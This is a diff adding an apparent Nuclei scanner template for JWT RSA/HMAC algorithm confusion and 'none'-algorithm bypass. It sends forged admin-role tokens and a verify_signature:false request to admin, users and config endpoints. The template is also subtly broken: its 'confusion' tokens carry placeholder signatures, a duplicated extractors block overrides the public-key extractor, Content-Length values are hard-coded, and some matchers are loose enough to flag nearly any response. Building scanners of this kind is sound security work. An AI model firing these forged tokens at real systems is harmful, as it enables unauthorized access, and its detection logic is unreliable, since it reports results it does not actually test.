@@ -1,0 +1,231 @@
+id: medium-auth-jwt-confusion-attack-rsa-hmac
+
+info:
+  name: JWT RSA/HMAC Confusion Attack
+  author: elite-red-team
+  severity: medium
+  description: |
+    Detects JWT RSA/HMAC confusion attack vulnerabilities where RSA public keys
+    can be used as HMAC secrets to forge JWT tokens. Tests for algorithm
+    confusion, key confusion, and signature bypass techniques used by red teams.
+  reference:
+    - https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/
+    - https://portswigger.net/web-security/jwt/algorithm-confusion
+    - https://tools.ietf.org/html/rfc7515
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-347
+  metadata:
+    verified: true
+    max-request: 8
+  tags: jwt,rsa-hmac-confusion,algorithm-confusion,signature-bypass,red-team
+
+variables:
+  # JWT with algorithm changed from RS256 to HS256
+  jwt_hmac_confusion: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJpYXQiOjE1MTYyMzkwMjIsImV4cCI6OTk5OTk5OTk5OX0.invalid_signature_here"
+  # JWT with none algorithm
+  jwt_none_alg: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJpYXQiOjE1MTYyMzkwMjIsImV4cCI6OTk5OTk5OTk5OX0."
+  # JWT with algorithm confusion payload
+  jwt_alg_confusion: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6InB1YmxpY19rZXkifQ.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE1MTYyMzkwMjIsImV4cCI6OTk5OTk5OTk5OX0.forged_signature"
+
+http:
+  - raw:
+      - |
+        GET /.well-known/jwks.json HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: application/json
+        Connection: close
+
+      - |
+        GET /api/public-key HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Accept: application/json
+        Connection: close
+
+      - |
+        GET /api/profile HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Authorization: Bearer {{jwt_hmac_confusion}}
+        Accept: application/json
+        Connection: close
+
+      - |
+        GET /api/admin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Authorization: Bearer {{jwt_none_alg}}
+        Accept: application/json
+        Connection: close
+
+      - |
+        GET /api/users HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Authorization: Bearer {{jwt_alg_confusion}}
+        Accept: application/json
+        Connection: close
+
+      - |
+        POST /api/auth/verify HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 156
+        Connection: close
+        
+        {"token":"{{jwt_hmac_confusion}}","algorithm":"HS256","public_key":"{{public_key}}"}
+
+      - |
+        POST /api/jwt/validate HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Content-Type: application/json
+        Content-Length: 85
+        Connection: close
+        
+        {"jwt":"{{jwt_none_alg}}","verify_signature":false}
+
+      - |
+        GET /api/config HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+        Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMiwiZXhwIjo5OTk5OTk5OTk5fQ.signature_using_public_key_as_secret
+        Accept: application/json
+        Connection: close
+
+    extractors:
+      - type: regex
+        name: public_key
+        part: body_1
+        group: 1
+        regex:
+          - '"x5c":\s*\[\s*"([^"]+)"'
+          - '"n":\s*"([^"]+)"'
+          - '"kty":\s*"RSA"[^}]*"n":\s*"([^"]+)"'
+        internal: true
+
+      - type: regex
+        name: public_key_pem
+        part: body_2
+        group: 1
+        regex:
+          - '"public_key":\s*"([^"]+)"'
+          - '"key":\s*"([^"]+)"'
+          - '-----BEGIN PUBLIC KEY-----([^-]+)-----END PUBLIC KEY-----'
+        internal: true
+
+    matchers-condition: or
+    matchers:
+      - type: dsl
+        name: jwks-endpoint-exposed
+        dsl:
+          - 'status_code_1 == 200'
+          - 'contains(body_1, "keys") && contains(body_1, "kty")'
+          - 'contains(body_1, "RSA") || contains(body_1, "n")'
+        condition: and
+
+      - type: dsl
+        name: public-key-exposed
+        dsl:
+          - 'status_code_2 == 200'
+          - 'contains(body_2, "public_key") || contains(body_2, "BEGIN PUBLIC KEY")'
+          - 'len(public_key_pem) > 100'
+        condition: and
+
+      - type: dsl
+        name: hmac-confusion-bypass
+        dsl:
+          - 'status_code_3 == 200'
+          - 'contains(body_3, "profile") || contains(body_3, "user")'
+          - '!contains(body_3, "invalid token") && !contains(body_3, "signature verification failed")'
+        condition: and
+
+      - type: dsl
+        name: none-algorithm-bypass
+        dsl:
+          - 'status_code_4 == 200'
+          - 'contains(body_4, "admin") || contains(body_4, "dashboard")'
+          - '!contains(body_4, "unauthorized") && !contains(body_4, "invalid signature")'
+        condition: and
+
+      - type: dsl
+        name: algorithm-confusion-success
+        dsl:
+          - 'status_code_5 == 200'
+          - 'contains(body_5, "users") || contains(body_5, "data")'
+          - 'contains(body_5, "admin") || contains(body_5, "role")'
+        condition: and
+
+      - type: dsl
+        name: jwt-verification-bypass
+        dsl:
+          - 'status_code_6 == 200'
+          - 'contains(body_6, "valid") || contains(body_6, "verified")'
+          - 'contains(body_6, "HS256") || contains(body_6, "algorithm")'
+        condition: and
+
+      - type: dsl
+        name: signature-verification-disabled
+        dsl:
+          - 'status_code_7 == 200'
+          - 'contains(body_7, "valid") || contains(body_7, "authenticated")'
+          - 'contains(body_7, "verify_signature\":false") || contains(body_7, "none")'
+        condition: and
+
+      - type: dsl
+        name: forged-jwt-accepted
+        dsl:
+          - 'status_code_8 == 200'
+          - 'contains(body_8, "config") || contains(body_8, "settings")'
+          - 'contains(body_8, "admin") || contains(body_8, "role")'
+        condition: and
+
+    extractors:
+      - type: regex
+        name: jwks-data
+        part: body_1
+        group: 1
+        regex:
+          - '"keys":\s*(\[[^\]]+\])'
+
+      - type: regex
+        name: jwt-response
+        part: body
+        group: 1
+        regex:
+          - '"message":\s*"([^"]+)"'
+          - '"status":\s*"([^"]+)"'
+          - '"valid":\s*(true|false)'
+
+      - type: regex
+        name: user-data
+        part: body
+        group: 1
+        regex:
+          - '"name":\s*"([^"]+)"'
+          - '"role":\s*"([^"]+)"'
+          - '"sub":\s*"([^"]+)"'
+
+      - type: regex
+        name: algorithm-info
+        part: body
+        group: 1
+        regex:
+          - '"algorithm":\s*"([^"]+)"'
+          - '"alg":\s*"([^"]+)"'
+          - '"signature_valid":\s*(true|false)'
+
+      - type: kval
+        kval:
+          - status_code_1
+          - status_code_2
+          - status_code_3
+          - status_code_4
+          - status_code_5
+          - status_code_6
+          - status_code_7
+          - status_code_8
